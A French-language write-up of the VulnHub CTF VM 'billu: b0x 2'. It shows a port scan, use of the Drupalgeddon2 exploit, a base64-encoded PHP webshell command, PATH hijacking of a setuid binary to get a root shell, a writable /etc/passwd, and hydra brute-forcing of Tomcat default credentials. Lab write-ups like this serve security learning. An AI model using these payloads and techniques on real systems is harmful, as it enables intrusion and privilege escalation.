---
title: "Solution du CTF billu: b0x 2 de VulnHub"
tags: [CTF, VulnHub]
---

[billu: b0x 2](https://vulnhub.com/entry/billu-b0x-2,238/) est une VM vulnérable créée par [@indishell1046](https://twitter.com/indishell1046) et publiée sur *VulnHub*. Le CTF indique qu'il y a deux façons d'obtenir un premier shell et deux façons d'escalader ses privilèges. On verra que ce n'est pas tout à fait le cas.

## La face A

Un scan de ports remonte un serveur web "classique" ainsi qu'un Tomcat :

```
22/tcp    open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.7 ((Ubuntu))
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35442/tcp   status
|   100024  1          44953/tcp6  status
|   100024  1          52229/udp   status
|_  100024  1          54061/udp6  status
8080/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
35442/tcp open  status  1 (RPC #100024)
```

Le port 80 sert un Drupal en version 8. Il existe une faille d'exécution de commande nommée _Drupalgeddon 2_ pour cette version :

[Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC) - PHP webapps Exploit](https://www.exploit-db.com/exploits/44448)

L'exploit trouvé sur *exploit-db* est assez simple et il fonctionne :

```console
$ python3 drupal.py
################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://192.168.56.197/

Check: http://192.168.56.197/hello.txt
```

On trouve effectivement le contenu qu'on attendait à l'URL indiquée, prouvant qu'on peut écrire ce que l'on souhaite sur le serveur.

J'ai changé l'exploit pour y placer la commande suivante :

```bash
echo PHByZT48P3BocCBzeXN0ZW0oJF9HRVRbImNtZCJdKTsgPz4K | base64 -d | tee shell.php
```

Qui va me placer un webshell à la racine du site.

Avec ce webshell je peux uploader puis lancer un reverse-ssh en mode bind sur le port 31337 et m'y connecter.

Je remarque alors un binaire setuid root dans `/opt` :

```console
www-data@billu-b0x:/var/www/html$ find / -type f -perm -u+s -ls 2> /dev/null 
130819    8 -rwsr-xr-x   1 root     root         7496 Jun  3  2018 /opt/s
```

Il semble appeler `setres(u|g)id` puis la commande `scp` via `system` :

```console
www-data@billu-b0x:/opt$ strings s
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
printf
setresgid
setresuid
system
getegid
geteuid
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
[^_]
starting copy of root user files....
scp -r /root/* b0x@127.0.0.1:/var/backup
--- snip ---
```

On va donc se placer dans le PATH pour que le programme appelle un script à nous plutôt que le vrai `scp` :

```console
www-data@billu-b0x:/tmp$ echo -e '!#/bin/bash\nbash -p' > scp 
www-data@billu-b0x:/tmp$ chmod +x scp
www-data@billu-b0x:/tmp$ PATH=/tmp:$PATH /opt/s
/tmp/scp: 1: /tmp/scp: !#/bin/bash: not found
root@billu-b0x:/tmp# id
uid=0(root) gid=33(www-data) groups=0(root),33(www-data)
```

## La face B

LinPEAS indique que `/etc/passwd` est world-writable :

```
╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ /etc/passwd is writable
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No
```

Ajouté à ça, un hash est présent dans le fichier :

```
indishell:$6$AunCdsxZ$OBxuMf0a/GqstthT4LEW8RGZxepGL7C3jHMk/IFyhLCTJ/.0fo/9Aa.s134i80zAr1HtdyICiogwDAXzG0NWZ0:1000:1000:indishell,,,:/home/indishell:/bin/bash
```

Il ne semble pas cassable, mais qu'importe, on peut passer root et rajoutant une ligne au fichier.

En revanche, bien qu'on puisse trouver des identifiants valides pour le Tomcat il s'avère que tous amènent à une erreur HTTP 403. Le second scénario d'exploitation web est donc impossible.

```console
$ hydra -L fuzzdb/wordlists-user-passwd/tomcat/tomcat_mgr_default_users.txt -P \
    fuzzdb/wordlists-user-passwd/tomcat/tomcat_mgr_default_pass.txt \
    http-head://192.168.56.197:8080/manager/html
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-13 16:16:00
[WARNING] http-head auth does not work with every server, better use http-get
[DATA] max 16 tasks per 1 server, overall 16 tasks, 30 login tries (l:6/p:5), ~2 tries per task
[DATA] attacking http-head://192.168.56.197:8080/manager/html
[8080][http-head] host: 192.168.56.197   login: role1   password: tomcat
[8080][http-head] host: 192.168.56.197   login: tomcat   password: tomcat
[8080][http-head] host: 192.168.56.197   login: both   password: tomcat
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-13 16:16:01
```
